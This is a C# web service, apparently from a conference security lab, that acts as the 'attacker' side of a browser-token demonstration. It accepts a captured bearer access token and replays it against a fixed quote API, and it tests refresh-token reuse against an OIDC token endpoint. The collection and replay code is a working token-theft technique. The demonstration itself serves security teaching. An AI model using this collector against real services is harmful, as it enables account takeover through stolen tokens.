using System.Net.Http.Headers;
using System.Text.Json;
using Common.Evidence;

// INTENTIONALLY UNSAFE DEMONSTRATION. No victim key, cookie or client secret is configured here.
// Opt-in attacker-side collector for the browser boundary demonstration. It observes the
// explicitly configured lab traffic; it has no role in Mervikon's business services. Keep this
// alongside the unsafe browser client and the conference-only deployment profile.
var builder = WebApplication.CreateBuilder(args);
builder.Logging.ClearProviders();
builder.WebHost.ConfigureKestrel(o => o.Limits.MaxRequestBodySize = 48000);
var origins = new[] { builder.Configuration["SpaOrigin"]!, builder.Configuration["BffOrigin"]! };
var target = new Uri(builder.Configuration["Target"]!);
var issuer = builder.Configuration["Issuer"]!;
if (target.Scheme != "https" || target.AbsolutePath != "/api/quote") throw new InvalidOperationException("Fixed HTTPS lab quote required.");
builder.Services.AddCors(o => o.AddDefaultPolicy(p => p.WithOrigins(origins).WithMethods("POST").WithHeaders("Content-Type")));
builder.Services.AddHttpClient("attacker", c => c.Timeout = TimeSpan.FromSeconds(10)).ConfigurePrimaryHttpMessageHandler(() => new HttpClientHandler { AllowAutoRedirect = false });
builder.Services.AddDemoEvidence();
var gate = new SemaphoreSlim(1);
var app = builder.Build();
app.UseCors();
app.Use(async (c, next) =>
{
    c.Response.Headers.CacheControl = "no-store";
    if (c.Request.Method == "POST" && !origins.Contains(c.Request.Headers.Origin.ToString()))
    {
        c.Response.StatusCode = 403;
        return;
    }
    await next(c);
});
app.MapGet("/health/live", () => Results.Ok(new { isolatedAttacker = true }));
app.MapPost("/collect", async (Capture value, IHttpClientFactory factory, ProtocolPublisher evidence, CancellationToken ct) =>
{
    if (value.RunId == Guid.Empty || value.AccessToken?.Length > 16000)
        return Results.BadRequest();
    if (!await gate.WaitAsync(0, ct))
        return Results.StatusCode(429);
    try
    {
        if (string.IsNullOrEmpty(value.AccessToken))
        {
            await evidence.Emit(new(value.RunId, DateTimeOffset.UtcNow, "Attacker", "capture", null, "observed"), ct);
            return Results.Ok(new
            {
                tokenCaptured = false,
                replayStatus = (int?)null
            });
        }
        using var request = new HttpRequestMessage(HttpMethod.Get, target);
        request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", value.AccessToken);
        using var response = await factory.CreateClient("attacker").SendAsync(request, ct);
        await evidence.Emit(new(value.RunId, DateTimeOffset.UtcNow, "Attacker", "replay", (int)response.StatusCode, "observed", EvidenceProjection.Token(value.AccessToken)), ct);
        return Results.Ok(new
        {
            tokenCaptured = true,
            fingerprint = EvidenceProjection.Fingerprint(value.AccessToken),
            replayStatus = (int?)response.StatusCode
        });
    }
    finally { gate.Release(); }
});
app.MapPost("/refresh-reuse", async (RefreshReuse value, IHttpClientFactory factory, ProtocolPublisher evidence, CancellationToken ct) =>
{
    if (value.RunId == Guid.Empty || string.IsNullOrEmpty(value.Previous) || string.IsNullOrEmpty(value.Successor) || value.Previous == value.Successor || value.Previous.Length > 16000 || value.Successor.Length > 16000)
        return Results.BadRequest();
    if (!await gate.WaitAsync(0, ct))
        return Results.StatusCode(429);
    try
    {
        using var client = factory.CreateClient("attacker");
        using var discovery = JsonDocument.Parse(await client.GetStringAsync(issuer.TrimEnd('/') + "/.well-known/openid-configuration", ct));
        if (discovery.RootElement.GetProperty("issuer").GetString() != issuer)
            return Results.Problem(statusCode: 502, title: "issuer_mismatch");
        var endpoint = new Uri(discovery.RootElement.GetProperty("token_endpoint").GetString()!);
        if (endpoint.Scheme != "https")
            return Results.Problem(statusCode: 502, title: "insecure_discovery");
        async Task<(int Status, string? Error)> Redeem(string token, string step)
        {
            using var response = await client.PostAsync(endpoint, new FormUrlEncodedContent(new Dictionary<string, string> { { "grant_type", "refresh_token" }, { "client_id", builder.Configuration["SpaClientId"]! }, { "refresh_token", token } }), ct);
            using var body = JsonDocument.Parse(await response.Content.ReadAsStringAsync(ct));
            var error = body.RootElement.TryGetProperty("error", out var e) ? EvidenceProjection.Error(e.GetString()) : null;
            await evidence.Emit(new(value.RunId, DateTimeOffset.UtcNow, "Attacker", step, (int)response.StatusCode, "observed", Error: error), ct);
            return ((int)response.StatusCode, error);
        }
        var replay = await Redeem(value.Previous, "refresh-reuse");
        var successor = await Redeem(value.Successor, "successor");
        return Results.Ok(new
        {
            oldTokenStatus = replay.Status,
            oldTokenError = replay.Error,
            successorStatus = successor.Status,
            successorError = successor.Error,
            familyRejectionObserved = replay.Error == "invalid_grant" && successor.Error == "invalid_grant",
            attackerClientCapability = "public client; no client secret",
            successorSuppliedBy = "controlled lab probe"
        });
    }
    finally { gate.Release(); }
});
app.Run();
internal sealed record Capture(Guid RunId, string? AccessToken);
internal sealed record RefreshReuse(Guid RunId, string Previous, string Successor);
